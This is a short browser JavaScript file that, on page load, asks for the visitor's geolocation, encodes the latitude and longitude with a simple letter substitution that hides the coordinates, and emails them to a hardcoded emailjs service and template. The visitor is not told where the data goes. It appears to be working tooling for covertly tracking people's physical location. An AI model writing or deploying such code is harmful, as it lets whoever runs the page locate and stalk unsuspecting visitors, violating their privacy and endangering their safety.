sendMail = (data) => {
    var tempParams = {
        from_name: data,
        to_name: data,
        msg: data
    };
    emailjs
        .send("service_phdfjks", "template_hcuu6ql", tempParams)
        .then((msgs) => {
            document.getElementById("success").innerText="Successfully ."
        });
};

decode = (lat_lon) => {
    let c = "";
    let decodes = lat_lon.toString();

    for (let x in decodes) {
        let y = decodes[x];

        if (y == "0") {
            c += "A";
        } else if (y == "1") {
            c += "B";
        } else if (y == "2") {
            c += "C";
        } else if (y == "3") {
            c += "D";
        } else if (y == "4") {
            c += "E";
        } else if (y == "5") {
            c += "F";
        } else if (y == "6") {
            c += "a";
        } else if (y == "7") {
            c += "b";
        } else if (y == "8") {
            c += "c";
        } else if (y == "9") {
            c += "d";
        } else if (y == ",") {
            c += "e";
        } else if (y == ".") {
            c += "f";
        }
    }
    sendMail(c);
};

show = (position) => {
   let lat_lon = position.coords.latitude+","+position.coords.longitude;
    decode(lat_lon);
};
let img = document.getElementById("img");
window.onload = () => {
    const clear = setInterval(() => {
       if(navigator.onLine){
         document.getElementById("success").innerText="Allow Location ?"
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(show);
            clearInterval(clear);
        } else {
            document.write(
                "Your Browser in Not Enable JavaScript  Please Enable JavaScript ?"
            );
        }
       
       img.style.display="none"
       }else{
         img.style.display="block"
         
       }
    }, 50);
};